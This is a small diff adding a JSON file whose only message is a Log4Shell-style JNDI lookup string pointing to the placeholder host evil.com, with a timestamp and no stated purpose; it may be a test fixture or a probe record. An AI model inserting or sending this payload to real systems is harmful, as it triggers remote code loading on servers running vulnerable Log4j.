@@ -1,0 +1,6 @@
+{
+  "messages": [
+    "${jndi:ldap://evil.com/a}"
+  ],
+  "updated_at": "2026-01-06T02:49:03.662406"
+}
